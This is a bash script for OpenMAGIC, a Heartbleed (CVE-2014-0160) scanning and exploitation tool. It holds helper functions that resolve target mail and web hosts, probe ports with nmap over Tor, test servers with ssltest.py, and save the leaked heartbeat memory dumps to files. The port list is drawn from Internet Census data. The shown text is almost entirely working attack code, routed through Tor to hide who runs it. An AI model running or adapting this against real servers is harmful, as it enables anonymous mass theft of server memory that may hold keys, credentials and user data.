#!/bin/bash
# OpenMAGIC v0.3
#
# OpenSSL TLS heartbeat read overrun (CVE-2014-0160)
# Written by Francesco `ascii` Ongaro - 20140218
# (C) ISGroup SRL - http://www.isgroup.biz

function is_ip() {
	# Based on https://github.com/marios-zindilis/Scripts/blob/master/Bash/is_ip.sh
	# by Marios Zindilis
	if [ `echo $1 | awk -F. '{ print NF -1 }'` -ne 3 ]; then
		return 1
	else
		for OCTET in `echo $1 | tr '.' ' '`; do
			if ! [[ $OCTET =~ ^[0-9]+$ ]] || [[ $OCTET -lt 0 ]] || [[ $OCTET -gt 255 ]]; then
				return 1
			fi
		done
	fi
	return 0
}

function resolve() {
	dig +noall +answer $2 $1
}

function mx() {
	if is_ip $1; then
		echo 10 $1
	else
		resolve $1 MX | sort -n -k 5,6 | awk '{print $5, $6}' | sed "s/\.$//g" | sort -u
	fi
}

function a() {
	if is_ip $1; then
		echo $1
	else
		resolve $1 A | awk '{print $5}' | sort -u
	fi
}

function ip() {
	resolveip $1 -s 2> /dev/null
}

function alive() {
	if [ `torify nmap -n -PN -p $2 $1 -oG - -open 2>/dev/null | grep -c "/open/"` -eq 1 ]; then
		return 0
	fi
	return 1
}

function vulnerable() {
	if [ `torify python ssltest.py $1 $2 2>/dev/null | grep -c "server is vulnerable"` -eq 1 ]; then
		return 0
	fi
	return 1
}

function fetch() {
	mkdir -p ssltest
	torify python ssltest.py $2 -p $3 -o ssltest/$1_$2_$3-$4.bin 2>/dev/null > ssltest/$1_$2_$3-$4.out
}

function sslports(){
	sort -r -n -k 4 internetcensus2012_ssl.txt | awk '{print $1}' | uniq | head -n $1
}
